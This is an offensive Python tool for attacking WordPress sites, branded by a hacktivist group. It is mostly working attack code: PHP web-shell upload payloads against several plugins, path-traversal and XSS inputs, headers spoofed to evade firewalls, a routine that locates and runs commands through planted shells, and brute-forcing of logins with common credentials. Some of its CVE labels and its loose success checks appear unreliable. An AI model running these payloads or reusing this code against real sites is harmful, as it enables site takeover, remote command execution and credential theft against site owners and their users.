#!/usr/bin/env python3
"""
WordPress Advanced Security Scanner & Exploiter v5.0
WITH WAF BYPASS & REAL EXPLOIT DETECTION
Tools by BCEVM - Hacktivist Indonesia
"""

import requests
import argparse
import os
import re
import sys
import json
import time
import hashlib
import random
import string
from urllib.parse import urlparse, urlencode, quote, unquote
from datetime import datetime
from colorama import init, Fore, Style, Back
import concurrent.futures
import base64

requests.packages.urllib3.disable_warnings()
init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}    ██████╗  ██████╗███████╗██╗   ██╗███╗   ███╗    {Fore.RED}       ║
║{Fore.YELLOW}    ██╔══██╗██╔════╝██╔════╝██║   ██║████╗ ████║    {Fore.RED}       ║
║{Fore.YELLOW}    ██████╔╝██║     █████╗  ██║   ██║██╔████╔██║    {Fore.RED}       ║
║{Fore.YELLOW}    ██╔══██╗██║     ██╔══╝  ██║   ██║██║╚██╔╝██║    {Fore.RED}       ║
║{Fore.YELLOW}    ██████╔╝╚██████╗███████╗╚██████╔╝██║ ╚═╝ ██║    {Fore.RED}       ║
║{Fore.CYAN}      WordPress Security Scanner v5.0 (WAF Bypass)      {Fore.RED}║
║{Fore.WHITE}         Real Exploit Detection & Advanced Techniques    {Fore.RED}║
║{Fore.GREEN}              Tools by BCEVM - Hacktivist Indonesia      {Fore.RED}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# Enhanced CVE Database with WAF Bypass Payloads
EXPLOIT_DB = {
    "contact-form-7": {
        "cves": [("CVE-2020-35489", "MEDIUM", "Stored XSS")],
        "exploits": [
            {
                "name": "cf7-xss-bypass-1",
                "type": "xss",
                "method": "POST",
                "path": "/",
                "params": {
                    "_wpcf7": "1",
                    "_wpcf7_unit_tag": "wpcf7-f1-p1-o1",
                    "_wpcf7_container_post": "0",
                    "your-name": "<img src=x onerror=alert(1)>"
                },
                "waf_bypass": True,
                "success_indicators": ["<img", "onerror", "alert("]
            },
            {
                "name": "cf7-direct-upload",
                "type": "file_upload", 
                "method": "POST",
                "path": "/wp-content/plugins/contact-form-7/includes/submission.php",
                "params": {"_wpcf7": "1"},
                "files": {
                    "file-1": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")
                },
                "waf_bypass": True,
                "success_indicators": ["upload", "success", "attachment"]
            }
        ]
    },
    "elementor": {
        "cves": [("CVE-2022-29455", "CRITICAL", "RCE")],
        "exploits": [
            {
                "name": "elementor-direct-upload",
                "type": "rce",
                "method": "POST", 
                "path": "/wp-admin/admin-ajax.php",
                "headers": {"X-Requested-With": "XMLHttpRequest"},
                "params": {
                    "action": "elementor_ajax",
                    "actions": '{"action":"upload_and_install_pro","data":{"fileName":"..//shell.php","fileData":"' + 
                              base64.b64encode(b"<?php system($_GET['cmd']); ?>").decode() + '"}}'
                },
                "waf_bypass": True,
                "success_indicators": ["success", "uploaded", "<?php"]
            }
        ]
    },
    "revslider": {
        "cves": [("CVE-2022-24087", "CRITICAL", "RCE")],
        "exploits": [
            {
                "name": "revslider-rce-direct",
                "type": "rce",
                "method": "POST",
                "path": "/wp-admin/admin-ajax.php",
                "params": {
                    "action": "revslider_ajax_action",
                    "client_action": "update_plugin",
                    "update_file": "../../../shell.php"
                },
                "files": {
                    "update_file": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")
                },
                "waf_bypass": True,
                "success_indicators": ["update", "success"]
            }
        ]
    },
    "js_composer": {
        "cves": [("CVE-2021-24212", "HIGH", "RCE")],
        "exploits": [
            {
                "name": "wpbakery-frontend-bypass",
                "type": "rce",
                "method": "GET",
                "path": "/index.php",
                "params": {
                    "vc_action": "vc_edit_form",
                    "vc_post_id": "1",
                    "tag": "vc_raw_html",
                    "shortcode": '[vc_raw_html]<?php echo "VULN" . `whoami`; ?>[/vc_raw_html]'
                },
                "waf_bypass": True,
                "success_indicators": ["VULN", "<?php", "uid="]
            }
        ]
    }
}

class WordPressScanner:
    def __init__(self, target, timeout=25, threads=3):
        self.target = self.normalize_target(target)
        self.domain = self.extract_domain(target)
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        })
        self.session.verify = False
        self.results = {
            "target": self.target,
            "wordpress": False,
            "version": None,
            "plugins": [],
            "theme": None,
            "users": [],
            "vulnerabilities": [],
            "exploits": [],
            "shells": [],
            "credentials": [],
            "waf_detected": False
        }
    
    def normalize_target(self, url):
        if not url.startswith("http"):
            url = "http://" + url  # Coba HTTP dulu
        return url.rstrip("/")
    
    def extract_domain(self, url):
        parsed = urlparse(url)
        return parsed.netloc or parsed.path
    
    def http_request(self, url, method="GET", data=None, files=None, headers=None, allow_redirects=True, bypass_waf=False):
        """HTTP request dengan WAF bypass techniques"""
        try:
            request_headers = self.session.headers.copy()
            if headers:
                request_headers.update(headers)
            
            # WAF Bypass headers
            if bypass_waf:
                bypass_headers = {
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "X-Originating-IP": "127.0.0.1",
                    "X-Remote-IP": "127.0.0.1",
                    "X-Remote-Addr": "127.0.0.1",
                    "X-Client-IP": "127.0.0.1",
                    "X-Host": "127.0.0.1",
                    "X-Forwarded-Host": "127.0.0.1",
                    "CF-Connecting-IP": "127.0.0.1",
                    "True-Client-IP": "127.0.0.1",
                    "Referer": self.target,
                    "Origin": self.target
                }
                request_headers.update(bypass_headers)
            
            if method.upper() == "GET":
                r = self.session.get(url, timeout=self.timeout, 
                                   allow_redirects=allow_redirects, headers=request_headers)
            elif method.upper() == "POST":
                r = self.session.post(url, data=data, files=files, 
                                    timeout=self.timeout, allow_redirects=allow_redirects, 
                                    headers=request_headers)
            else:
                return "", 0, {}
            
            # Cek jika WAF terdeteksi
            if len(r.text) == 0 and r.status_code == 200:
                self.results["waf_detected"] = True
            
            return r.text, r.status_code, r.headers
        except Exception as e:
            return f"Error: {str(e)[:50]}", 0, {}
    
    def detect_wordpress(self):
        """WordPress detection dengan multiple techniques"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Detecting WordPress...")
        
        wp_indicators = []
        
        # Coba HTTP dan HTTPS
        protocols = ["http://", "https://"]
        base_domain = self.domain
        
        for protocol in protocols:
            test_url = protocol + base_domain
            html, status, _ = self.http_request(test_url)
            
            if status > 0:
                # Update target jika berhasil
                self.target = test_url.rstrip("/")
                
                # Cek WordPress patterns
                patterns = [
                    (r'/wp-content/|/wp-includes/|/wp-json/', "Path references"),
                    (r'wordpress|WordPress', "WordPress mention"),
                    (r'id="wp-"|class="wp-', "WP classes"),
                    (r'content=["\']WordPress', "Generator meta")
                ]
                
                for pattern, desc in patterns:
                    if re.search(pattern, html, re.IGNORECASE):
                        wp_indicators.append(f"{desc} ({protocol[:-3]})")
                
                if wp_indicators:
                    break
        
        # Cek common paths
        check_paths = [
            ("/wp-login.php", "Login page"),
            ("/wp-admin/", "Admin area"),
            ("/xmlrpc.php", "XML-RPC"),
            ("/readme.html", "Readme file")
        ]
        
        for path, desc in check_paths:
            url = self.target + path
            _, status, _ = self.http_request(url)
            if status in [200, 301, 302, 403, 401]:
                wp_indicators.append(f"{desc} ({status})")
        
        self.results["wordpress"] = len(wp_indicators) >= 2
        return wp_indicators
    
    def get_wp_version(self):
        """Get WordPress version"""
        sources = [
            (self.target + "/readme.html", r'Version\s+([\d.]+)'),
            (self.target + "/feed/", r'generator>https://wordpress\.org/\?v=([\d.]+)<'),
            (self.target, r'content="WordPress\s+([\d.]+)"'),
            (self.target + "/wp-links-opml.php", r'generator="WordPress/([^"]+)"')
        ]
        
        for url, pattern in sources:
            html, status, _ = self.http_request(url)
            if status == 200:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    if re.match(r'^\d+(\.\d+)+$', version):
                        self.results["version"] = version
                        return version
        return None
    
    def find_plugins(self):
        """Find plugins dengan aggressive discovery"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Discovering plugins...")
        
        html, _, _ = self.http_request(self.target)
        plugins = set()
        
        # Cari di HTML
        plugin_patterns = [
            r'/wp-content/plugins/([^/"\'>]+)/',
            r'plugins=([^&"\'>]+)',
            r'wp-content/plugins/([^/]+)/'
        ]
        
        for pattern in plugin_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                plugin = match.lower().strip()
                if plugin and '.' not in plugin and len(plugin) < 30:
                    plugins.add(plugin)
        
        # Cek plugin dari exploit DB
        for plugin in EXPLOIT_DB.keys():
            check_url = f"{self.target}/wp-content/plugins/{plugin}/"
            _, status, _ = self.http_request(check_url)
            if status in [200, 301, 302, 403]:
                plugins.add(plugin)
        
        self.results["plugins"] = sorted(list(plugins))
        return self.results["plugins"]
    
    def check_vulnerabilities(self):
        """Check vulnerabilities"""
        vulnerabilities = []
        
        for plugin in self.results["plugins"]:
            plugin_name = plugin.split()[0].lower()
            
            if plugin_name in EXPLOIT_DB:
                for cve in EXPLOIT_DB[plugin_name]["cves"]:
                    vulnerabilities.append({
                        "plugin": plugin_name,
                        "cve": cve[0],
                        "severity": cve[1],
                        "description": cve[2],
                        "exploits": len(EXPLOIT_DB[plugin_name]["exploits"])
                    })
        
        self.results["vulnerabilities"] = vulnerabilities
        return vulnerabilities
    
    def exploit_with_waf_bypass(self, plugin_name, exploit_name=None):
        """Advanced exploitation dengan WAF bypass"""
        if plugin_name not in EXPLOIT_DB:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploits for {plugin_name}")
            return False
        
        exploits = EXPLOIT_DB[plugin_name]["exploits"]
        
        if exploit_name:
            exploit = next((e for e in exploits if e["name"] == exploit_name), None)
            if not exploit:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Exploit not found")
                return False
            exploits = [exploit]
        
        successful = []
        
        for exploit in exploits:
            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Testing: {exploit['name']} ({exploit['type'].upper()})")
            
            url = self.target + exploit["path"]
            method = exploit.get("method", "GET")
            bypass = exploit.get("waf_bypass", False)
            
            try:
                if method == "POST":
                    files = exploit.get("files")
                    headers = exploit.get("headers", {})
                    
                    if files:
                        content, status, _ = self.http_request(
                            url, method="POST", data=exploit.get("params", {}), 
                            files=files, headers=headers, bypass_waf=bypass
                        )
                    else:
                        content, status, _ = self.http_request(
                            url, method="POST", data=exploit.get("params", {}), 
                            headers=headers, bypass_waf=bypass
                        )
                else:
                    # GET request
                    params = exploit.get("params", {})
                    if params:
                        query = urlencode(params, quote_via=quote)
                        url_full = f"{url}?{query}"
                    else:
                        url_full = url
                    
                    headers = exploit.get("headers", {})
                    content, status, _ = self.http_request(url_full, headers=headers, bypass_waf=bypass)
                
                print(f"  URL: {url_full if 'url_full' in locals() else url}")
                print(f"  Status: {status}, Length: {len(content)}")
                
                # SMART DETECTION
                if len(content) == 0:
                    print(f"  {Fore.RED}[-]{Style.RESET_ALL} Empty response - WAF likely blocking")
                    success = False
                else:
                    success = False
                    
                    # Check success indicators
                    indicators = exploit.get("success_indicators", [])
                    for indicator in indicators:
                        if indicator.lower() in content.lower():
                            success = True
                            print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Indicator found: '{indicator}'")
                            break
                    
                    # Additional checks
                    if not success and exploit['type'] == 'xss':
                        if '<script>' in content or 'alert(' in content:
                            success = True
                            print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} XSS patterns detected")
                    
                    if not success and exploit['type'] == 'rce':
                        if '<?php' in content or 'system(' in content or 'exec(' in content:
                            success = True
                            print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} RCE patterns detected")
                    
                    if not success and status == 200 and len(content) > 100:
                        # Check for generic success
                        if any(word in content.lower() for word in ['success', 'ok', 'updated', 'saved']):
                            success = True
                            print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Generic success detected")
                
                # Store results
                result = {
                    "plugin": plugin_name,
                    "exploit": exploit["name"],
                    "url": url_full if 'url_full' in locals() else url,
                    "method": method,
                    "payload": exploit.get("params", {}),
                    "status": status,
                    "length": len(content),
                    "success": success,
                    "waf_bypass": bypass
                }
                
                self.results["exploits"].append(result)
                
                if success:
                    successful.append(result)
                    print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} EXPLOIT SUCCESSFUL!")
                    
                    # Jika file upload, cari shell
                    if exploit['type'] in ['file_upload', 'rce']:
                        self.find_uploaded_shells()
                
            except Exception as e:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Error: {str(e)[:50]}")
        
        return len(successful) > 0
    
    def find_uploaded_shells(self):
        """Cari shell yang mungkin sudah terupload"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Checking for uploaded shells...")
        
        shell_names = ["shell.php", "bcevm.php", "cmd.php", "rce.php"]
        locations = [
            "/wp-content/uploads/",
            "/wp-content/uploads/2024/",
            "/wp-content/uploads/2023/",
            "/wp-content/plugins/",
            "/"
        ]
        
        for location in locations:
            for shell in shell_names:
                url = self.target + location + shell
                content, status, _ = self.http_request(f"{url}?cmd=echo+BCEVM")
                
                if status == 200:
                    # Cek jika shell aktif
                    if 'BCEVM' in content or '<?php' in content:
                        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Shell found: {url}")
                        self.results["shells"].append({
                            "url": url,
                            "test": f"{url}?cmd=whoami",
                            "verified": True
                        })
                        return url
        
        return None
    
    def test_direct_file_upload(self):
        """Test direct file upload methods"""
        print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Testing direct file upload methods...")
        
        # Method 1: Media upload via XML-RPC
        if self.check_xmlrpc():
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} XML-RPC enabled - possible upload vector")
        
        # Method 2: Direct POST to upload directories
        upload_endpoints = [
            f"{self.target}/wp-content/uploads/",
            f"{self.target}/wp-admin/async-upload.php",
            f"{self.target}/xmlrpc.php"
        ]
        
        for endpoint in upload_endpoints:
            print(f"  Testing: {endpoint}")
            _, status, _ = self.http_request(endpoint)
            print(f"    Status: {status}")
    
    def check_xmlrpc(self):
        """Check if XML-RPC is enabled"""
        url = f"{self.target}/xmlrpc.php"
        content, status, _ = self.http_request(url)
        
        if status == 200 and "XML-RPC server accepts POST requests" in content:
            return True
        return False
    
    def brute_force_login_fast(self):
        """Fast brute force dengan common credentials"""
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Fast brute force attempt...")
        
        login_url = f"{self.target}/wp-login.php"
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("administrator", "administrator"),
            ("wordpress", "wordpress"),
            ("test", "test")
        ]
        
        for user, pwd in common_creds:
            data = {
                'log': user,
                'pwd': pwd,
                'wp-submit': 'Log In',
                'redirect_to': f'{self.target}/wp-admin/'
            }
            
            _, status, headers = self.http_request(login_url, method="POST", data=data)
            
            if status == 302 and 'wp-admin' in str(headers.get('location', '')):
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} CREDENTIALS: {user}:{pwd}")
                self.results["credentials"].append({
                    "username": user,
                    "password": pwd
                })
                return (user, pwd)
        
        print(f"{Fore.RED}[-]{Style.RESET_ALL} No common credentials worked")
        return None
    
    def scan_all(self):
        """Complete scan dengan WAF detection"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Starting comprehensive scan...")
        print(f"{Fore.WHITE}[=]{Style.RESET_ALL} Target: {self.target}")
        
        # WordPress detection
        indicators = self.detect_wordpress()
        if not self.results["wordpress"]:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} WordPress not detected")
            return self.results
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} WordPress detected ({len(indicators)} indicators)")
        
        # Get version
        version = self.get_wp_version()
        if version:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Version: {version}")
        
        # Find plugins
        plugins = self.find_plugins()
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Plugins found: {len(plugins)}")
        for plugin in plugins:
            print(f"  - {plugin}")
        
        # Check vulnerabilities
        vulns = self.check_vulnerabilities()
        if vulns:
            print(f"\n{Fore.RED}[!]{Style.RESET_ALL} VULNERABILITIES FOUND: {len(vulns)}")
            for vuln in vulns:
                color = Fore.RED if vuln["severity"] in ["CRITICAL", "HIGH"] else Fore.YELLOW
                print(f"  {color}• {vuln['plugin']}: {vuln['cve']} ({vuln['severity']}){Style.RESET_ALL}")
                print(f"      {vuln['description']} - {vuln['exploits']} exploit(s) available")
        
        return self.results
    
    def generate_actionable_report(self):
        """Generate actionable report dengan exploit details"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/{self.domain}_{timestamp}_actionable.txt"
        
        os.makedirs("reports", exist_ok=True)
        
        report = [
            "=" * 70,
            "BCEVM WordPress Security Scan - ACTIONABLE REPORT",
            f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Target: {self.target}",
            f"WAF Detected: {'YES' if self.results['waf_detected'] else 'NO'}",
            "=" * 70,
            "",
            "[TARGET OVERVIEW]",
            f"WordPress: {'DETECTED' if self.results['wordpress'] else 'NOT DETECTED'}",
            f"Version: {self.results.get('version', 'Unknown')}",
            f"Plugins: {len(self.results['plugins'])}",
            "",
            "[VULNERABILITIES]",
        ]
        
        for vuln in self.results['vulnerabilities']:
            report.append(f"• {vuln['plugin']} - {vuln['cve']} ({vuln['severity']})")
            report.append(f"  Description: {vuln['description']}")
        
        if self.results['exploits']:
            report.extend([
                "",
                "[EXPLOITATION RESULTS]",
            ])
            
            successful = [e for e in self.results['exploits'] if e.get('success')]
            if successful:
                report.append(f"Successful Exploits: {len(successful)}")
                for exp in successful:
                    report.append(f"\n✓ {exp['plugin']}/{exp['exploit']}")
                    report.append(f"  URL: {exp['url']}")
                    report.append(f"  Method: {exp['method']}")
                    if exp.get('payload'):
                        report.append(f"  Payload: {exp['payload']}")
                    report.append(f"  Status: {exp['status']}, Length: {exp['length']}")
            
            failed = [e for e in self.results['exploits'] if not e.get('success')]
            if failed and len(failed) > 0:
                report.append(f"\nFailed Exploits: {len(failed)}")
                for exp in failed[:5]:  # Limit to 5 failed
                    report.append(f"  ✗ {exp['plugin']}/{exp['exploit']} - Status: {exp['status']}")
        
        if self.results['shells']:
            report.extend([
                "",
                "[UPLOADED SHELLS]",
            ])
            for shell in self.results['shells']:
                report.append(f"• {shell['url']}")
                report.append(f"  Test Command: {shell['test']}")
        
        if self.results['credentials']:
            report.extend([
                "",
                "[CREDENTIALS FOUND]",
            ])
            for cred in self.results['credentials']:
                report.append(f"• {cred['username']}:{cred['password']}")
        
        report.extend([
            "",
            "[NEXT STEPS]",
            "1. Manual testing of successful exploit URLs",
            "2. Try different payload variations",
            "3. Check for other attack vectors (SQLi, LFI)",
            "4. Enumerate more users for brute force",
            "",
            "=" * 70,
            "BCEVM - Hacktivist Indonesia",
            "=" * 70
        ])
        
        with open(filename, 'w') as f:
            f.write("\n".join(report))
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Actionable report saved: {filename}")
        return filename

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="BCEVM WordPress Security Scanner v5.0 (WAF Bypass)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://target.com --scan
  %(prog)s https://target.com --exploit
  %(prog)s https://target.com --waf-bypass
  %(prog)s -f targets.txt (scan from file)
        """
    )
    
    parser.add_argument("target", nargs="?", help="Target URL")
    parser.add_argument("-f", "--file", help="Scan targets from file")
    parser.add_argument("--scan", action="store_true", help="Scan only")
    parser.add_argument("--exploit", action="store_true", help="Exploit vulnerabilities")
    parser.add_argument("--waf-bypass", action="store_true", help="Use WAF bypass techniques")
    parser.add_argument("--brute", action="store_true", help="Brute force login")
    parser.add_argument("--upload-test", action="store_true", help="Test file upload methods")
    
    args = parser.parse_args()
    
    # Handle file input
    if args.file:
        if not os.path.exists(args.file):
            print(f"{Fore.RED}[!]{Style.RESET_ALL} File not found: {args.file}")
            return
        
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Scanning {len(targets)} targets from file...")
        
        for i, target in enumerate(targets, 1):
            print(f"\n{'='*60}")
            print(f"{Fore.YELLOW}[{i}/{len(targets)}]{Style.RESET_ALL} Target: {target}")
            print(f"{'='*60}")
            
            try:
                scanner = WordPressScanner(target)
                scanner.scan_all()
                
                if args.exploit:
                    for vuln in scanner.results["vulnerabilities"]:
                        scanner.exploit_with_waf_bypass(vuln["plugin"])
                
                scanner.generate_actionable_report()
                
            except Exception as e:
                print(f"{Fore.RED}[!]{Style.RESET_ALL} Error: {str(e)}")
        
        return
    
    if not args.target:
        print(f"{Fore.RED}[!]{Style.RESET_ALL} Please provide a target or use -f for file input")
        parser.print_help()
        return
    
    scanner = WordPressScanner(args.target)
    
    # Scan
    scanner.scan_all()
    
    # WAF detection message
    if scanner.results["waf_detected"]:
        print(f"\n{Fore.RED}[!]{Style.RESET_ALL} WAF DETECTED - Using bypass techniques")
    
    # Exploit jika diminta
    if args.exploit or args.waf_bypass:
        print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Starting exploitation with WAF bypass...")
        
        for vuln in scanner.results["vulnerabilities"]:
            print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Exploiting: {vuln['plugin']}")
            scanner.exploit_with_waf_bypass(vuln["plugin"])
    
    # Brute force
    if args.brute:
        scanner.brute_force_login_fast()
    
    # Upload test
    if args.upload_test:
        scanner.test_direct_file_upload()
    
    # Generate report
    report_file = scanner.generate_actionable_report()
    
    # Show summary
    successful_exploits = [e for e in scanner.results['exploits'] if e.get('success')]
    if successful_exploits:
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} SUCCESSFUL EXPLOITS ({len(successful_exploits)}):")
        for exp in successful_exploits:
            print(f"  • {exp['plugin']}/{exp['exploit']}")
            print(f"    URL: {exp['url']}")
    
    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Scan completed!")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Detailed report: {report_file}")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Tools by BCEVM - Hacktivist Indonesia")

if __name__ == "__main__":
    main()
